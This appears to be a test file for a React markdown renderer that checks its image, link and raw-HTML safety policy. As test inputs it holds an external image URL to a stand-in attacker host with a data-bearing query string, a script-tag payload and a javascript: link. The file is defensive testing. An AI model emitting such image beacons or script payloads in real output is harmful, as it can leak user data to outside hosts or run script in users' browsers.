import { describe, expect, test } from "bun:test"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { MarkdownContent, isSafeImageSrc } from "../src/components/markdown-content"

const render = (content: string) => renderToStaticMarkup(createElement(MarkdownContent, { content }))

describe("markdown image policy", () => {
  test("external images become a placeholder with alt text and no request", () => {
    const html = render("![secret chart](https://evil.example/p.png?d=abc)")
    expect(html).not.toContain("<img")
    expect(html).not.toContain("evil.example")
    expect(html).not.toContain("<a ")
    expect(html).toContain("secret chart")
  })
  test("protocol-relative and tracking-pixel forms are blocked", () => {
    expect(render("![](//evil.example/x.png)")).not.toContain("<img")
    expect(render("![x](http://evil.example/x.png)")).not.toContain("<img")
  })
  test("data images and same-origin paths render", () => {
    expect(render("![d](data:image/png;base64,AAAA)")).toContain("<img")
    expect(render("![l](/assets/logo.png)")).toContain("<img")
  })
  test("non-image data urls are blocked", () => {
    expect(isSafeImageSrc("data:text/html;base64,AAAA")).toBe(false)
    expect(isSafeImageSrc("data:image/svg+xml;base64,AAAA")).toBe(true)
    expect(isSafeImageSrc(undefined)).toBe(false)
  })
})

describe("markdown links and html", () => {
  test("links open in a new tab with noopener noreferrer nofollow", () => {
    const html = render("[x](https://example.com)")
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer nofollow"')
  })
  test("raw html is not rendered", () => {
    const html = render('<img src="https://evil.example/x.png"><script>alert(1)</script>hi')
    expect(html).not.toContain("<img")
    expect(html).not.toContain("<script")
  })
  test("javascript: links are not emitted", () => {
    expect(render("[x](javascript:alert(1))")).not.toContain("javascript:")
  })
})
